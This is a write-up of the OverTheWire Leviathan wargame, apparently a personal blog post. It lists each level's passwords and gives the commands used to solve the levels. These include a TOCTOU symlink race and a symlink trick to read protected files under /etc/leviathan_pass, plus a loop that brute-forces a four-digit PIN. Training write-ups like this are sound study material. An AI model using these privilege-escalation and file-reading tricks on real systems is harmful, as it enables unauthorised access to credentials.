+++
title = "Leviathan"
date = "2024-12-23T06:17:50+03:00"
#dateFormat = "2006-01-02" # This value can be configured for per-post date formatting
author = "Tariq Baater"
authorTwitter = "tariqbaater" #do not include @
cover = "/over-the-wire.png"
tags = ["cybersecurity", "ctf", "overthewire"]
keywords = ["", ""]
description = "Overthewire Leviathan Writeup"
showFullContent = false
readingTime = true
hideComments = false
+++

# Leviathan

## leviathan0
username: leviathan0  
password: leviathan0  
ssh port: 2223

use grep to find the password.


## leviathan1
username: leviathan1  
password: 3QJ3TgzHDq

read the binary and trace with ltrace and strings.


## leviathan2
username: leviathan2  
password: NsN1HwFoyN

if you ltrace the the binary 'printfile' you will see it's using access() function that is known for a vulnerability TOCTOU (Time-of-check to time-of-use) and was mostly abused using symlinks.

Check the binary how it works
```bash
ltrace -f ./printfile filename
```
Since we found that access has a delay reading files, we can use that opportunity to read a filtered file.
The idea is to modify the file between the moment it gets checked for permissions and the moment it gets opened. This is done by creating a symlink on the file, targeting the real file we wanna access.

You'll need to run the commands on two separate screens, first we will chain multiple commands to symlink the target file to our tmp file in tmp then watch it run every 0.1 seconds.

```bash
watch -n 0.1 touch /tmp/tmpfolder/lev3; ln -sf /etc/leviathan_pass/lev3 /tmp/tmpfolder/lev3; rm /tmp/tmpfolder/lev3
```

On the second screen i will use a for loop to print the file 50 times hoping that i catch the delay loop hole before being restricted.
```bash
for i in {1..50}; do     ./printfile /tmp/sbin/lev3; done
```
After few loops the intended output will be printed.

```bash
You cant have that file...
You cant have that file...
You cant have that file...
You cant have that file...
You cant have that file...
You cant have that file...
f0n8h2iWLP
You cant have that file...
You cant have that file...
You cant have that file...
```

## leviathan3
username: leviathan3  
password: f0n8h2iWLP

read the binary 'level3' and trace with ltrace and strings, there is a string comparison, same as as leviathan1.


## leviathan4
username: leviathan4  
password: WG1egElCvO

There is a binary labelled 'bin' in a hidden trash directory, if executed it prints out binary bytes. So i used the below script to decode the bytes to ascii text.

```bash
#!/bin/bash
for binary in "$@"; do
    printf "\\$(printf '%03o' "$((2#$binary))")"
done
```

If you run the above script against the binary you will find your password for leviathan5.

```bash
chmod +x script.sh
./script 00110000 01100100 01111001 01111000 01010100 00110111 01000110 00110100 01010001 01000100 00001010
0dyxT7F4QD
```

## leviathan5
username: leviathan5  
password: 0dyxT7F4QD

This one is also fairly easy.

```bash
# If you echo foo into the file and run the leviathan5 binary, it will print out the file content.
echo "foo" > /tmp/file.log
# output: foo

# so all we have to do is to link the leviathan6 password file to /tmp/file.log
ln -sf /etc/leviathan_pass/leviathan6 /tmp/file.log

# and run the leviathan5 binary
./leviathan5 /tmp/file.log
# output: szo7HDB88w
```


## leviathan6
username: leviathan6  
password: szo7HDB88w

There is a binary that requires a 4 digit code, so i used the below script to generate the code.

```bash
for i in {1..9999}; do ./leviathan6 $i; done
```
Eventually one of the loop will crack the code and we get shell, just cat the next level password.


## leviathan7
username: leviathan7  
password: qEs5Io5yM8

And that's it for now.

